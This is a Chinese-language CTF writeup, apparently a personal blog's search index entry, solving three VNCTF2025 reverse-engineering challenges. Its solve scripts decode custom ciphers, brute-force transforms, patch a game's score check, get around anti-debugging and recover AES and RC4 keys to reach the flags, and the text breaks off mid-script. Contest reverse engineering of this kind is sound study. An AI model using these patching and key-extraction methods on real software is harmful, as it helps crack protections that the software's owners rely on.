<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>VNCTF2025-Writeup-Reverse</title>
    <link href="/2025/02/10/VNCTF2025%20Writeup%20Reverse/"/>
    <url>/2025/02/10/VNCTF2025%20Writeup%20Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="VNCTF2025-Writeup-Reverse"><a href="#VNCTF2025-Writeup-Reverse" class="headerlink" title="VNCTF2025 Writeup Reverse"></a>VNCTF2025 Writeup Reverse</h1><h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><h3 id="“但是太阳，它每时每刻都是夕阳也都是旭日。当它熄灭着走下山去收尽苍凉残照之际，正是它在另一面燃烧着爬上山巅布散烈烈朝辉之时。”"><a href="#“但是太阳，它每时每刻都是夕阳也都是旭日。当它熄灭着走下山去收尽苍凉残照之际，正是它在另一面燃烧着爬上山巅布散烈烈朝辉之时。”" class="headerlink" title="“但是太阳，它每时每刻都是夕阳也都是旭日。当它熄灭着走下山去收尽苍凉残照之际，正是它在另一面燃烧着爬上山巅布散烈烈朝辉之时。”"></a>“但是太阳，它每时每刻都是夕阳也都是旭日。当它熄灭着走下山去收尽苍凉残照之际，正是它在另一面燃烧着爬上山巅布散烈烈朝辉之时。”</h3><p>好久没有更新博客了，在不断的被否定与碰壁中艰难行走，VNCTF2025交出了自己接触CTF以来的最完美的答卷，虽然没有AK，但赛后也努力解出了。感谢一路上给予我指点的师傅和陪伴我的朋友们，我相信我会越来越好。</p><p>Just reverse it！</p><h2 id="fish-hook"><a href="#fish-hook" class="headerlink" title="fish_hook"></a>fish_hook</h2><p>jadx看逻辑</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250208234806158.png" alt="image-20250208234806158"></p><p>提示联网再钓鱼，又有个download hook_fish.dex,字符串搜一下</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250208234853691.png" alt="image-20250208234853691"></p><p>搜到一个地址<a href="http://47.121.211.23/hook_fish.dex">http://47.121.211.23/hook_fish.dex</a></p><p>下载hook_fish.dex</p><p>继续审main的逻辑</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250208235030116.png" alt="image-20250208235030116"></p><p>先对每个字符+68，再转成hex， 再进行递归的相邻换位(index:0&lt;——&gt;1,2&lt;——&gt;3这样换)，</p><p>异或换位相当于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">code</span><span class="hljs-params">(<span class="hljs-type">char</span> *a, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> len)</span> <br>&#123;<br>    <span class="hljs-keyword">if</span> (index &gt;= len - <span class="hljs-number">1</span>) <br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">char</span> temp = a[index];<br>    a[index] = a[index + <span class="hljs-number">1</span>];<br>    a[index + <span class="hljs-number">1</span>] = temp;<br>    code(a, index + <span class="hljs-number">2</span>, len);<br>&#125;<br></code></pre></td></tr></table></figure><p>再进行一个加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i2 &lt; str3.length; i2++)<br>&#123;<br>            <span class="hljs-keyword">if</span> (str3[i2] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; str3[i2] &lt;= <span class="hljs-string">&#x27;f&#x27;</span>) <br>            &#123;<br>                str3[i2] = (<span class="hljs-type">char</span>) ((str3[i2] - <span class="hljs-string">&#x27;1&#x27;</span>) + (i2 % <span class="hljs-number">4</span>));<br>            &#125; <br>    <span class="hljs-keyword">else</span> <br>            &#123;<br>                str3[i2] = (<span class="hljs-type">char</span>) (str3[i2] + <span class="hljs-string">&#x27;7&#x27;</span> + (i2 % <span class="hljs-number">10</span>));<br>            &#125;<br>        &#125;<br><br></code></pre></td></tr></table></figure><p>最后进了fish_hook.hex</p><p> jadx分析fish_hook.hex</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250208235345483.png" alt="image-20250208235345483"></p><p>给了一个码表然后对应转化成</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji</span><br></code></pre></td></tr></table></figure><p>思路是先查表还原对应回去，然后爆破一下加密，然后换位回去之后转回字符再-68即可</p><p>exp如下：</p><p>fish1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FishDecoder</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.fish_dcode = &#123;<br>            <span class="hljs-string">&quot;iiijj&quot;</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&quot;jjjii&quot;</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&quot;jijij&quot;</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&quot;jjijj&quot;</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&quot;jjjjj&quot;</span>: <span class="hljs-string">&#x27;e&#x27;</span>,<br>            <span class="hljs-string">&quot;ijjjj&quot;</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&quot;jjjji&quot;</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&quot;iijii&quot;</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&quot;ijiji&quot;</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&quot;iiiji&quot;</span>: <span class="hljs-string">&#x27;j&#x27;</span>,<br>            <span class="hljs-string">&quot;jjjij&quot;</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&quot;jijji&quot;</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&quot;ijiij&quot;</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&quot;iijji&quot;</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&quot;ijjij&quot;</span>: <span class="hljs-string">&#x27;o&#x27;</span>,<br>            <span class="hljs-string">&quot;jiiji&quot;</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&quot;ijijj&quot;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&quot;jijii&quot;</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&quot;iiiii&quot;</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&quot;jjiij&quot;</span>: <span class="hljs-string">&#x27;t&#x27;</span>,<br>            <span class="hljs-string">&quot;ijjji&quot;</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&quot;jiiij&quot;</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&quot;iiiij&quot;</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&quot;iijij&quot;</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&quot;jjiji&quot;</span>: <span class="hljs-string">&#x27;y&#x27;</span>,<br>            <span class="hljs-string">&quot;jijjj&quot;</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&quot;iijjl&quot;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&quot;iiilj&quot;</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&quot;iliii&quot;</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&quot;jiili&quot;</span>: <span class="hljs-string">&#x27;4&#x27;</span>,<br>            <span class="hljs-string">&quot;jilji&quot;</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&quot;iliji&quot;</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&quot;jjjlj&quot;</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&quot;ijljj&quot;</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&quot;iljji&quot;</span>: <span class="hljs-string">&#x27;9&#x27;</span>,<br>            <span class="hljs-string">&quot;jjjli&quot;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, cipher_text</span>):<br>        chunks = [cipher_text[i:i+<span class="hljs-number">5</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher_text), <span class="hljs-number">5</span>)] <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(self.fish_dcode.get(chunk, <span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> chunks)  <br><br>decoder = FishDecoder()<br>cipher_text = <span class="hljs-string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>  <br>plain_text = decoder.decode(cipher_text)<br><span class="hljs-built_in">print</span>(plain_text)<br><br></code></pre></td></tr></table></figure><p> 得到：0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5</p><p>fish2.c(可见字符范围内爆破)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> s[<span class="hljs-number">72</span>];<br><span class="hljs-type">char</span> t[]=<span class="hljs-string">&quot;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5&quot;</span>;<br><span class="hljs-type">int</span> p;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">72</span>;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b=<span class="hljs-number">40</span>;b&lt;=<span class="hljs-number">128</span>;b++)<br>&#123;<br><span class="hljs-keyword">if</span>(b &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; b &lt;= <span class="hljs-string">&#x27;f&#x27;</span>)<br>            p= (b-<span class="hljs-string">&#x27;1&#x27;</span>) + (i% <span class="hljs-number">4</span>);<br><span class="hljs-keyword">else</span> <br>           p= (b+<span class="hljs-string">&#x27;7&#x27;</span>)+ (i% <span class="hljs-number">10</span>);<br>           <span class="hljs-keyword">if</span>(p==t[i])<br>           &#123;<br>           s[i]=b;<br>           <span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;   <br>&#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i =<span class="hljs-number">71</span>; i &gt; <span class="hljs-number">0</span>; i -= <span class="hljs-number">2</span>) <br>&#123;<br>        <span class="hljs-type">char</span> temp = s[i];<br>        s[i] = s[i<span class="hljs-number">-1</span>];<br>        s[i<span class="hljs-number">-1</span>]=temp;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">72</span>;i++) <br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, s[i]);<br>    &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到：9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1</p><p>fish3.c</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">#include&lt;stdio<span class="hljs-number">.</span>h&gt;<br><span class="hljs-keyword">int</span> main()<br>&#123;<br><span class="hljs-keyword">int</span> d[]=&#123;<br><span class="hljs-number">0x9a</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xa9</span>,<br><span class="hljs-number">0x78</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xa3</span>,<br><span class="hljs-number">0x8c</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x75</span>,<br><span class="hljs-number">0x97</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc1</span>&#125;<span class="hljs-comment">;</span><br>for(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;36;i++)</span><br>&#123;<br>d[i]-=<span class="hljs-number">68</span><span class="hljs-comment">;</span><br>printf(<span class="hljs-string">&quot;%c&quot;</span>,d[i])<span class="hljs-comment">;</span><br>&#125;<br>    return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>拆开之后-68运行即可</p><p>得到flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">VNCTF</span>&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!<span class="hljs-number">1</span>l&#125;<br></code></pre></td></tr></table></figure><h2 id="Fuko’s-starfish"><a href="#Fuko’s-starfish" class="headerlink" title="Fuko’s starfish"></a>Fuko’s starfish</h2><p>一堆反调试去不干净，没办法进行动调，硬着头皮运行程序</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209105435245.png" alt="image-20250209105435245"></p><p>先猜数，二分直接过掉</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/2222222.png" alt="2222222"></p><p>然后是个贪吃蛇，玩不过去</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209105738562.png" alt="image-20250209105738562"></p><p>ida找到贪吃蛇的逻辑发现是score达到23过关</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209110113298.png" alt="image-20250209110113298"></p><p>直接patch一下改到0</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209110317426.png" alt="image-20250209110317426"></p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209110336842.png" alt="image-20250209110336842"></p><p>这样就直接过了第二关，看到如下提示</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-2025020911044442.png" alt="image-2025020911044442"></p><p>去审贪吃蛇胜利之后的逻辑看到函数sub_1800025F0</p><p>直接反编译会出问题，有call $5指令，全部nop</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209110940585.png" alt="image-20250209110940585"></p><p>前面有字符串输出，是加密字符串后（xor 0x17）再输出的</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209111039936.png" alt="image-20250209111039936"></p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209111128334.png" alt="image-20250209111128334"></p><p>赛博厨子证实了猜测</p><p>审后面的加密逻辑，发现是AES</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209111252589.png" alt="image-20250209111252589"></p><p>但是这里有个反调试，检测到调试器的时候直接用key，没检测到的时候异或0x17</p><p>动调不起来，但是key的值又缺四个字节的，查看交叉引用发现一个可疑的rand函数，但是显示出的几个不是密钥</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209111509258.png" alt="image-20250209111509258"></p><p>往下追nop掉一个retn，发现了srand和真正的rand</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209111847084.png" alt="image-20250209111847084"></p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209111900240.png" alt="image-20250209111900240"></p><p>直接抄出来跑一下异或0x17得到密钥</p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> <br>&#123;<br>    srand(<span class="hljs-number">0x1BF52</span>u);<br>    <span class="hljs-type">uint8_t</span> a[<span class="hljs-number">16</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++) <br>&#123;<br>        <span class="hljs-type">int</span> r=rand();<br>        a[i]=(r+r/<span class="hljs-number">255</span>)^<span class="hljs-number">0x17</span>; <br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++) <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X&quot;</span>,a[i]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行得到key：09E5FDEB683175B6B13B840891EB78D2</p><p>算法没有魔改，赛博厨子一把梭</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209113037915.png" alt="image-20250209113037915"></p><p>得到flag：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">VNCTF&#123;W0w_u_g0t_Fuk0<span class="hljs-symbol">&#x27;s_st4rf1sh</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="抽奖转盘"><a href="#抽奖转盘" class="headerlink" title="抽奖转盘"></a>抽奖转盘</h2><p>人生第一次完成鸿蒙逆向，略显兴奋的同时记录一下解题过程</p><p> 先去看了so</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209114513028.png" alt="image-20250209114513028"></p><p>一个base64，一个魔改的rc4，最后多xor了40，key是Take_it_easy</p><p>jadx-dev-all.jar反编译modules.abc，看到了承接MyCry的地方</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209114304949.png" alt="image-20250209114304949"></p><p>加密过程有了开始翻密文（翻了很久）</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/3333333.png" alt="3333333"></p><p>找到了密文，发现密文里明显不是base64的可见字符，推测java层有加密</p><p>继续审java层逻辑发现了一个对于密文的小加密，+1再xor7</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209115134450.png" alt="image-20250209115134450"></p><p>解密流程是先解Java层，然后解base64，然后解魔改rc4</p><p>homo.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">101</span>, <span class="hljs-number">74</span>, <span class="hljs-number">76</span>, <span class="hljs-number">49</span>, <span class="hljs-number">101</span>, <span class="hljs-number">76</span>, <span class="hljs-number">117</span>, <span class="hljs-number">87</span>, <span class="hljs-number">55</span>, <span class="hljs-number">69</span>, <span class="hljs-number">118</span>, <span class="hljs-number">68</span>, <span class="hljs-number">118</span>, <span class="hljs-number">69</span>, <span class="hljs-number">55</span>, <span class="hljs-number">67</span>, <span class="hljs-number">61</span>, <span class="hljs-number">83</span>, <span class="hljs-number">62</span>, <span class="hljs-number">111</span>, <span class="hljs-number">81</span>, <span class="hljs-number">77</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">53</span>, <span class="hljs-number">73</span>, <span class="hljs-number">83</span>, <span class="hljs-number">66</span>, <span class="hljs-number">68</span>, <span class="hljs-number">114</span>, <span class="hljs-number">109</span>, <span class="hljs-number">108</span>, <span class="hljs-number">75</span>, <span class="hljs-number">66</span>, <span class="hljs-number">97</span>, <span class="hljs-number">117</span>, <span class="hljs-number">93</span>, <span class="hljs-number">127</span>, <span class="hljs-number">115</span>, <span class="hljs-number">124</span>, <span class="hljs-number">109</span>, <span class="hljs-number">82</span>, <span class="hljs-number">93</span>, <span class="hljs-number">115</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">44</span>;i++)<br>&#123;<br>a[i]^=<span class="hljs-number">7</span>;<br>a[i]-=<span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解得：aLJ5aJqO&#x2F;ApBpA&#x2F;C9S8gUIsa1MSDBtijKDeqYwsziTYs</p><p>解base64有：68b279689a8efc0a41a40fc2f52f20508b1ad4c48306d8a32837aa630b3389362c</p><p>最后解rc4</p><p>homo.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize_key_schedule</span>(<span class="hljs-params">key</span>):<br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    sbox = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + sbox[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        sbox[i], sbox[j] = sbox[j], sbox[i]<br><br>    <span class="hljs-keyword">return</span> sbox<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_keystream</span>(<span class="hljs-params">sbox</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + sbox[i]) % <span class="hljs-number">256</span><br>        sbox[i], sbox[j] = sbox[j], sbox[i]<br><br>        keystream_value = sbox[(sbox[i] + sbox[j]) % <span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">yield</span> keystream_value<br><br><br>key = <span class="hljs-string">b&#x27;Take_it_easy&#x27;</span> <br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;68b279689a8efc0a41a40fc2f52f20508b1ad4c48306d8a32837aa630b3389362c&#x27;</span>)<br><br>sbox = initialize_key_schedule(key)<br>keystream_generator = generate_keystream(sbox)<br><br>plaintext = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(byte ^<span class="hljs-number">0x28</span>^<span class="hljs-built_in">next</span>(keystream_generator)) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ciphertext)<br><br><span class="hljs-built_in">print</span>(plaintext)<br></code></pre></td></tr></table></figure><p>解得YQFWI~MXvwb’qhbLdvwbgdqfhb5358$，不太对的样子，猜测还有没看到的加密，由flag头VNCTF猜要减3,尝试一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> a[]=<span class="hljs-string">&quot;YQFWI~MXvwb&#x27;qhbLdvwbgdqfhb5358$&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span 